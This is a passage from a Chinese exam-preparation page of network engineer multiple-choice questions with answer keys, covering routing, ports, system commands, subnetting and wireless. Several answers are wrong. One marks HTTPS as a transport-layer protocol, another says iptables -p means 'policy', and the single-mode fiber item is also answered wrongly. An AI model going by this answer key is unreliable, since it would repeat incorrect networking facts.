Response采用（）进行传送。</p><p>A.广播<br>B.组播<br>C.多播<br>D.单播<br>A.广播<br>B.组播<br>C.多播<br>D.单播</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520130543099.png" alt="img"></p><blockquote><p>答：C,D</p></blockquote><ul><li><ol><li>Ping采用了（）类型的ICMP查询报文。</li></ol><p>A.Echo Reply<br>B.Host Unreachable<br>C.Redirect for host<br>D.Source Queach</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520175135088.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下关于路由协议的叙述中，错误的是（）。</li></ol><p>A.路由协议是通过执行一个算法来完成路由选择额一种协议<br>B.动态路由协议可以分为距离向量路由协议和链路状态路由协议<br>C.路由协议是一种运行数据包在主机之间传送信息的协议 (不是用于传输)<br>D.路由器之间可以通过路由协议学习网络的拓扑结构</p></li></ul><blockquote><p>答： C</p></blockquote><ul><li><ol><li>以下关于RIPv2和RIPv1改进的说法中，错误的是（）。</li></ol><p>A.RIPv2是基于链路状态的路由协议<br>B.RIPv2可以支持VLSM<br>C.RIPv2可以支持认证，有明文和MD5两种方式<br>D.RIPv2采用的是组播更新</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520175737635.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下关于OSPF路由协议说法中，错误的是（）。</li></ol><p>A.OSPF是基于分布式的链路状态协议<br>B.OSPF是一种内部网关路由协议<br>C.OSPF可以用于自治系统之间的路由选项 (BGP)<br>D.OSPF为减少泛洪链路状态的信息量</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520180949216.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于IS-IS路由协议的说法中，错误的是（）。</li></ol><p>A.IS-IS是基于距离矢量的路由协议<br>B.IS-IS属于内部网关路由协议<br>C.IS-IS路由协议将自治系统分为骨干区域和非骨干区域<br>D.IS-IS路由协议中Leve-2路由器可以和不同区域的Level-2或者Level-1-2路由器形成邻居关系。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520181039607.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下关于BGP路由协议的说法中，错误的是（）。</li></ol><p>A.BGP协议是一种外部网关协议<br>B.BGP协议为保证可靠性使用TCP作为承载协议，使用端口号是179<br>C.BGP协议使用keep-alive报文周期性的证实邻居站的连通性<br>D.BGP协议不支持路由汇聚功能</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520181143246.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列协议中，使用明文传输的是（）。</li></ol><p>A.SSH<br>B.Telnet<br>C.SFTP<br>D.HTTPS</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在浏览器地址栏输入<a href="ftp://ftp.tsinghua.edu.cn/%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E6%97%B6%EF%BC%8C%E9%A6%96%E5%85%88%E6%89%A7%E8%A1%8C%E7%9A%84%E6%93%8D%E4%BD%9C%E6%98%AF%EF%BC%88%EF%BC%89%E3%80%82">ftp://ftp.tsinghua.edu.cn/进行访问时，首先执行的操作是（）。</a></li></ol><p>A.域名解析<br>B.建立控制命令连接<br>C.建立文件传输连接<br>D.发送FTP命令</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列端口中，不属于常用电子邮件协议默认使用的端口是（）。</li></ol><p>A.23<br>B.25<br>C.110<br>D.143</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520183847577.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在Linux中，用于解析主机域名的文件是（）。</li></ol><p>A.&#x2F;dev&#x2F;host.conf<br>B.&#x2F;etc&#x2F;hosts<br>C.&#x2F;dev&#x2F;resolv.conf<br>D.&#x2F;etc&#x2F;resolv.conf</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520181848459.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在Linux中，可以使用命令（）将文件abe.txt拷贝到目录&#x2F;home&#x2F;my&#x2F;office中，且保留原文件访问权限。</li></ol><p>A.$ cp -l abc.txt &#x2F;home&#x2F;my&#x2F;office<br>B.$ cp -p abc.txt &#x2F;home&#x2F;my&#x2F;office<br>C.$ cp -R abc.txt &#x2F;home&#x2F;my&#x2F;office<br>D.$ cp -f abc.txt &#x2F;home&#x2F;my&#x2F;office</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520184305762.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在Linux中，要使用命令“chmod -R xxx&#x2F;home&#x2F;abc”修改目录&#x2F;home&#x2F;abc的访问权限为可读、可写、可执行，命令中的“XXX” 应该是（）。</li></ol><p>A.777<br>B.555<br>C.444<br>D.222</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520184508894.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在Windows中，DNS客户端手工向服务器注册时使用的命令是（）。</li></ol><p>A.ipconfig &#x2F;release<br>B.ipconfig &#x2F;flushdns<br>C.ipconfig &#x2F;displaydns<br>D.ipconfig &#x2F;registerdns</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>Windows Server 2008 R2上内嵌的Web服务器是（）服务器。</li></ol><p>A.IIS<br>B.Apache<br>C.Tomcat<br>D.Nginx</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>Windows中，在命令输入（）命令可以得到如下的回显。</li></ol><p>A.nslookup -type&#x3D;A xxx.edu.cn<br>B.nslookup -type&#x3D;CNAME xxx.edu.cn<br>C.nslookup -type&#x3D;NS xxx.edu.cn<br>D.nslookup -type&#x3D;PTR xxx.edu.cn</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520185127196.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520185153035.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><p>37.38. 用户使用 <a href="ftp://zza.com/">ftp://zza.com</a> 访问某文件服务，默认通过目标端口为（）的请求报文建立（）链接。</p><p>A.20<br>B.21<br>C.22<br>D.23<br>A.TCP<br>B.UDP<br>C.HTTP<br>D.FTP</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520185319566.png" alt="img"></p><blockquote><p>答：B,A</p></blockquote><ul><li><ol><li>以下关于电子邮件服务的说法中，正确的是（）。</li></ol><p>A.收到的邮件会即时自动的存储在预定目录中<br>B.电子邮件需要用户手动接收<br>C.不同操作系统使用不同的默认端口<br>D.电子邮件地址格式允许用户自定义</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520185408417.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>用户可以使用（）向DHCP服务器重新请求IP地址配置。</li></ol><p>A.ipconfig &#x2F;renew<br>B.ipconfig &#x2F;release<br>C.ipcofnig &#x2F;reconfig<br>D.ipcofnig &#x2F;reboot</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520185530256.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>Linux防火墙iptables命令的-p参数表示（）。</li></ol><p>A.协议<br>B.表<br>C.策略<br>D.跳转</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520185630800.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520185653462.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在防火墙域间安全策略中，不是outbound方向数据流的是（）。</li></ol><p>A.从Trust区域到Local区域的数据流<br>B.从Trust区域到Untrust区域的数据流<br>C.从Trust区域到DMZ区域的数据流<br>D.从DMZ区域到Untrust区域的数据流</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520185811251.png" alt="img"></p><blockquote><p>答：A</p></blockquote><blockquote><p>解析：可信度；inside:85,local:100,dmz:50,internet:5; 高-&gt;低是outbond，低-&gt;高inbond</p></blockquote><ul><li><ol><li>PKC证书主要用于确保（）的合法性。</li></ol><p>A.主体私钥<br>B.CA私钥<br>C.主体公钥<br>D.CA公钥</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>AES是一种（）。</li></ol><p>A.公钥加密算法 （非对称加密）<br>B.流密码算法 (内容和密码长度一样)<br>C.分组加密算法<br>D.消息摘要算法</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520190127921.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于HTTPS的描述中，正确的是（）。</li></ol><p>A.HTTPS和SHTTP是同一个协议的不同简称<br>B.HTTPS服务器端使用的缺省TCP端口是110<br>C.HTTPS是传输层协议 (应用层)<br>D.HTTPS是HTTP和SSL&#x2F;TLS的组合</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520190302850.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>与SNMP所采用的传输层协议相同的是（）。</li></ol><p>A.HTTP<br>B.SMTP<br>C.FTP<br>D.DNS</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520190404679.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>交换机的二层转发表空间被占满，清空后短时间内仍然会被沾满，造成这种现象的原因可能是（）。</li></ol><p>A.交换机内存故障<br>B.存在环路造成广播风暴<br>C.接入设备过多<br>D.利用假的MAC进行攻击</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>某网络结构如下图所示。PC1的用户在浏览器地址栏中输入<a href="http://www.abc.com不能获取响应页面,而输入61.102.58.77可以正常打开web页面,则导致该现象的可能是()./">www.abc.com不能获取响应页面，而输入61.102.58.77可以正常打开Web页面，则导致该现象的可能是（）。</a></li></ol><p>A.域名解析失败<br>B.网关配置错误<br>C.PC1网络参数配置错误<br>D.路由配置错误</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520190530728.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><p>49.50. 某数据中心做存储系统设计，从性价比角度考量，最合适的冗余是（）。当该RAID配备N块磁盘时，实际可用数为（）块。</p><p>A.RAID 0<br>B.RAID 1<br>C.RAID 5<br>D.RAID 10<br>A.N<br>B.N-1<br>C.N&#x2F;2<br>D.N4</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520190756068.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520190819762.png" alt="img"></p><blockquote><p>答：C,B</p></blockquote><ul><li><ol><li>下面的IP地址中，能够作为主机地址的是（）。</li></ol><p>A.168.254.0.243&#x2F;30<br>B.10.20.30.40&#x2F;29<br>C.172.168.18.0&#x2F;22<br>D.192.168.11.191&#x2F;26</p></li></ul><blockquote><p>答：C, 解析：主机位不是全0或者1</p></blockquote><ul><li><ol><li>下面的IP地址中，不属于同一个网络的是（）。</li></ol><p>A.172.20.34.28&#x2F;21<br>B.172.20.39.100&#x2F;21<br>C.172.20.32.176&#x2F;21<br>D.172.20.40.177&#x2F;21</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><p>53.54. 某公司中最大的局域网可容纳200个主机，最小的局域网可容纳20个主机。用可变长子网掩码划分子网，其最长的掩码（）位，最短的掩码（）。</p><p>A.24<br>B.25<br>C.26<br>D.27<br>A.24<br>B.25<br>C.26<br>D.27</p></li></ul><blockquote><p>答：D,A</p></blockquote><ul><li><ol><li>PC1的IP地址为192.168.5.16,PC2的IP地址为192.168.5.100,PC1和PC2在同一网段中，其子网掩码可能是（）。</li></ol><p>A.255.255.255.240<br>B.255.255.255.224<br>C.255.255.255.192<br>D.255.255.255.128</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列命令片段含义是（）。</li></ol><p>A.配置端口镜像<br>B.配置链路聚合<br>C.配置逻辑接口<br>D.配置访问控制策略</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>使用（）命令可以显示OSPF接口信息。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520194022904.png" alt="img"></p><pre><code class="hljs axapta">A.<span class="hljs-keyword">display</span> ospf errorB.<span class="hljs-keyword">display</span> <span class="hljs-keyword">this</span>C.<span class="hljs-keyword">display</span> ospf briefD.<span class="hljs-keyword">display</span> ospf <span class="hljs-keyword">interface</span>复制代码</code></pre><blockquote><p>答：D</p></blockquote><ul><li><ol><li>GVRP是跨交换机进行VLAN动态注册和删除的协议，关于对GVRP描述不准确的是（）。</li></ol><p>A.GVRP是GARP的一种应用，由IEEE制定<br>B.交换机之间的协议报文交互必须在VLAN Trunk链路上进行<br>C.GVRP协议所支持的VLANID范围为1-1001 (1-4094)_<br>D.GVRP配置时需要再每一台交换机上建立VLAN</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>使用命令vlan batch 10 15 to 19 25 28 to 30 创建了（）个LVAN。</li></ol><p>A.6<br>B.10<br>C.5<br>D.9</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><p>60.61. VLAN帧的最小帧长是（）字节，其中表示帧优先级的字段是（）。</p><p>A.60<br>B.64<br>C.1518<br>D.1522<br>A.Type<br>B.PRI<br>C.CFI<br>D.VID</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520194401467.png" alt="img"></p><blockquote><p>答：B,B, (64~1522)</p></blockquote><ul><li><ol><li>与CSMA相比，CSMA&#x2F;CD（）。</li></ol><p>A.充分利用传播延迟远小于传输延迟的特性，减少了冲突后信道的浪费<br>B.将冲突的产生控制在传播时间内，减少了冲突的概率<br>C.在发送数据前和发送数据过程中侦听信道，不会产生冲突<br>D.站点竞争信道，提高了信道的利用率</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520194653104.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>采用CSMA&#x2F;CD进行介质访问，两个站点连续冲突3次后再次冲突的概率（）。</li></ol><p>A.12<br>B.1&#x2F;4<br>C.1&#x2F;8<br>D.1&#x2F;16</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520194935684.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列通信技术标准中，使用频段相同的是（）。</li></ol><p>A.802.11a和802.11b<br>B.802.11b和802.11g<br>C.802.11a和802.11g<br>D.802.11a和802.11n</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520195058595.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下关于WiFi6的说法中，错误的是（）。</li></ol><p>A.支持完整版MU-MIMO<br>B.理论吞吐量最高可达9.6Gbps<br>C.遵从协议802.11ax<br>D.工作段在5GHZ (还有2.4)</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520195156801.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下关于无线漫游的说法中，错误的是（）。</li></ol><p>A.漫游是由AP发起的 (客户端)<br>B.漫游分为二层漫游和三层漫游<br>C.三层漫游必须在同一个SSID<br>D.客户端在AP间漫游，AP可以处于不同的VLAN</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在大型无线网络中，AP通常通过DHCP Option ()来获取AC的IP地址。</li></ol><p>A.43<br>B.60<br>C.66<br>D.138</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520195409602.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>网络规划中，冗余设计不能（）。</li></ol><p>A.提高链路可靠性<br>B.增强负载能力<br>C.提高数据安全性<br>D.加快路由收敛</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520195522098.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>某公司局域网使用DHCP动态获取10.10.10.1&#x2F;24网段的IP地址，某天公司大量终端获得了192.168.1.0&#x2F;24网段的地址，可在接入交换机上配置（）功能杜绝该问题再次出现。</li></ol><p>A.dhcp relay<br>B.dhcp snooping (屏蔽局域网内的非法DHCP服务器)<br>C.mac-address static<br>D.arp static</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>项目范围管理过程如下所示，其正确的流程顺序是（）。</li></ol><p>1.定义范围<br>2.核实范文<br>3.收集需求<br>4.控制范围<br>5.创建工作分解结构<br>A.24135<br>B.12435<br>C.35124<br>D.31524</p></li></ul><blockquote><p>答：D</p></blockquote><h2 id="2021年5月"><a href="#2021年5月" class="headerlink" title="2021年5月"></a>2021年5月</h2><ul><li><ol><li>以下关于RISC和CISC计算机的叙述中，正确的是（）。</li></ol><p>A.RISC不采用流水线技术，CISC采用流水线技术<br>B.RISC使用复杂的指令，CISC使用简单的指令<br>C.RISC采用很少的通用寄存器，CISC采用很多的通用寄存器<br>D.RISC采用组合逻辑控制器，CISC普遍采用微程序控制器</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520195923903.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下关于闪存（Flash Memory）的叙述中，错误的是（）。</li></ol><p>A.掉电后信息不回丢失，属于非易失性存储器<br>B.以块为单位进行删除操作<br>C.采用随机访问方式，常用来代替主存<br>D.在嵌入式系统中用来代替ROM存储器</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于区块链的说法中，错误的是（）。</li></ol><p>A.比特币的底层技术是区块链<br>B.区块链技术是一种全面记账的方式<br>C.区块链是加密数据按照时间顺序叠加生成临时、不可逆向的记录 (51%的算力修改，就可以同步了，理论上可以逆向)<br>D.目前区块链可分为公有链、私有链、联盟链三种类型</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>基于Android的移动端开发平台是一个以（）为基础的开源移动设备操作系统。</li></ol><p>A.Windows<br>B.Unix<br>C.Linux<br>D.DOS</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>企业信息化的作用不包括（）。</li></ol><p>A.优化企业资源配置<br>B.实现规范化的流程管理<br>C.延长产品的开发周期<br>D.提高生产效率、降低运营成本</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>（）指用计算机平均每秒能执行的百万条指令数来衡量计算机性能的一种指标。</li></ol><p>A.CPI<br>B.PCI<br>C.MIPS<br>D.MFLOPS</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>根据《计算机软件保护条例》的规定，对软件著作权的保护不包含（）。</li></ol><p>A.目标程序<br>B.软件文档<br>C.源程序<br>D.软件中采用的算法</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520200517301.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>对十进制数47和0.25分别表示为十六进制形式，为（）。</li></ol><p>A.2F，0.4<br>B.2F, 0.D<br>C.3B，0.4<br>D.3B. 0.D</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520200601454.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520200639028.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>软件的（）是以用户为主，包括软件开发人员和质量保证人员都参加的考试，一般使用实际应用数据进行测试，除了测试软件功能和性能外，还对软件可移植性、兼容性、可维护性、错误的恢复功能等进行确认。</li></ol><p>A.单元测试<br>B.集成测试<br>C.系统测试<br>D.验收测试</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520200805137.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>“当多个事务并发执行时，任一事务的更新操作直到其成功提交的整个过程，对其他事务都是不可见的”，这一特性通常被称为事务的（）。</li></ol><p>A.原子性<br>B.一致性<br>C.隔离性<br>D.持久性</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520200912890.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列通信设备中，采用存储-转发方式处理信号的设备是（）。</li></ol><p>A.中继器 (广播)<br>B.放大器 （）<br>C.交换机<br>D.集线器</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>光信号在单模光纤中是以（）方式传播。</li></ol><p>A.直线传播 (轴向)<br>B.渐变发射<br>C.突变发射<br>D.无线收发</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520201810041.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520201853790.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在曼彻斯特编码中，若波特率为10Mbps，其数据速率为（）Mbps。</li></ol><p>A.5<br>B.10<br>C.16<br>D.20</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520201939834.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>100BASE-FX采用的编码技术为（）。</li></ol><p>A.曼彻斯特编码<br>B.4B5B+NRZI<br>C.MLT-3+NRZI<br>D.8B6T</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520202033999.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在PCM中，若对模拟型号的采样值使用64级量化，则至少需使用（）位二进制。</li></ol><p>A.4<br>B.5<br>C.6<br>D.7</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>万兆以太网中，传输距离最远的是（）。</li></ol><p>A.10GBASE-S<br>B.10GBASE-L<br>C.10GBASE-LX4<br>D.10GBASE-E</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520202217250.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>2.4GHz频段划分成11个互相覆盖的信道，中心频率间隔为（）MHz。</li></ol><p>A.4<br>B.5<br>C.6<br>D.7</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520202301535.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下编码中，编码效率最高的是（）。</li></ol><p>A.BAMI (效率0.63，通过高低电平)<br>B.曼彻斯特编码 （50%）<br>C.4B5B （80%）<br>D.DRZI （100%）</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>一台关于HDLC协议的说法中，错误的是（）。</li></ol><p>A.HDLC是一种面向比特计数的同步链路控制协议<br>B.应答RNR5表明编码号为4之前的帧均正确，接受站忙暂停接受下一帧<br>C.信息帧仅能承载有用户数据，不得做它用<br>D.传输的过程中采用无编号帧进行链路的控制</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520202506400.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>ICMP是TCP&#x2F;IP分层模型第三层协议，其报文封装在（）中传送。</li></ol><p>A.以太帧<br>B.IP数据报<br>C.UDP报文<br>D.TCP报文</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520202608614.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><p>21.22. TCP使用的流量控制协议是（），TCP头中与之相关的字段是（）。</p><p>A.停等应答<br>B.可变大小的滑动窗口协议<br>C.固定大小的滑动窗口协议<br>D.选择重发ARQ协议<br>A.端口号<br>B.偏移<br>C.窗口<br>D.紧急指针</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520203013882.png" alt="img"></p><blockquote><p>答：B,C</p></blockquote><ul><li><ol><li>TCP伪首部不包含的字段为（）。</li></ol><p>A.源地址<br>B.目的地址<br>C.标识符<br>D.协议</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520203059699.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><p>24.25. 假设一个IP数据包总长度为3000B，要经过一段MTU为1500B的链路，该IP数据报必须经过分片才能通过该链路。该原始IP数据包需被分成（）个片，若IP首部没有可选字段，则最后一个片首部中offset字段为（）。</p><p>A.2<br>B.3<br>C.4<br>D.5<br>A.370<br>B.740<br>C.1480<br>D.2960</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520203116103.png" alt="img"></p><blockquote><p>答：3,A</p></blockquote><ul><li><ol><li>用于自治系统（AS）之间路由选择的路由协议是（）。</li></ol><p>A.RIP<br>B.OSPF<br>C.IS-IS<br>D.BGP</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下关于OSPF协议的描述中，错误的是（）。</li></ol><p>A.OSPF是一种链路状态协议<br>B.OSPF路由器中可以配置多个路由进程<br>C.OSPF网络中用区域0来表示主干网<br>D.OSPF使用LSA报文维护邻居关系</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>Telnet是一种用于远程访问的协议。以下关于Telnet描述中，正确的是（）。</li></ol><p>A.不能传输登录口令<br>B.默认端口号是23<br>C.一种安全的通信协议<br>D.用UDP作为传输层协议</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在浏览器地址栏输入192.168.1.1进行访问时，首先执行的操作是（）。</li></ol><p>A.域名解析<br>B.解释执行<br>C.发送页面请求报文<br>D.建立TCP连接</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>SMTP的默认服务端口号是（）。</li></ol><p>A.25<br>B.80<br>C.110<br>D.143</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520203730196.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>6to4是一种支持IPv6站点通过IPv4网络进行通信的技术，下面IP地址中（）属于6to4地址。</li></ol><p>A.FE90::5EFE:10.40.1.29<br>B.FE80::5EFE:192.168.31.30<br>C.2002:C000:022A::<br>D.FF80:2ABC:0212</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520203813764.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>使用（）格式的文件展示视频动画可以提高网页内容的载入速度。</li></ol><p>A..jpg<br>B..avi<br>C..gif<br>D..rm</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>对一个新的Qos通信进行网络资源预约，以确保足够的资源来保证所请求的QOS，该规则属于IntServ规定的4种用于提供QoS传输机制中的（）规则。</li></ol><p>A.准入控制<br>B.路由选择算法<br>C.排队规则<br>D.丢弃策略</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520203946225.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在Windows系统中，用于清除本地DNS缓存的命令是（）。</li></ol><p>A.ipconfig &#x2F;release<br>B.ipconfig &#x2F;flushdns<br>C.ipconfig &#x2F;dispalydns<br>D.ipconfig &#x2F;registerdns</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520204113209.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>Windows Server 2008 R2上可配置（）服务，提供文件的上传和下载服务。</li></ol><p>A.DHCP<br>B.DNS<br>C.FTP<br>D.远程桌面</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><p>36.37. Windows系统中，DHCP客户端通过发送（）报文请求IP地址配置信息，当指定的时间内未接收到地址配置信息时，客户端可能使用的IP地址是（）。</p><p>A.DHCP Discover<br>B.DHCP request<br>C.DHCP renew<br>D.HDCP ack<br>A.0.0.0.0<br>B.255.255.255.255<br>C.169.254.0.1<br>D.192.168.1.1</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520204319346.png" alt="img"></p><blockquote><p>答：A,C</p></blockquote><ul><li><p>38.邮件客户端需监听（）端口及时接收邮件。</p><p>A.25 (SMTP)<br>B.50<br>C.100<br>D.110 (POP3)</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>通常使用（）为IP数据报文进行加密。</li></ol><p>A.IPSec<br>B.PPP2P<br>C.HTTPS<br>D.TLS</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520204455125.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>网管员在Windows系统中，使用下面的命令：得到的输出结果是（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520204530222.png" alt="img"></p><pre><code class="hljs vim">A.<span class="hljs-keyword">cc</span>.<span class="hljs-keyword">com</span>主机的IP地址B.<span class="hljs-keyword">cc</span>.<span class="hljs-keyword">com</span>的邮件交换服务器地址C.<span class="hljs-keyword">cc</span>.<span class="hljs-keyword">com</span>的别名D.<span class="hljs-keyword">cc</span>.<span class="hljs-keyword">com</span>的PTP指针复制代码</code></pre><p><img 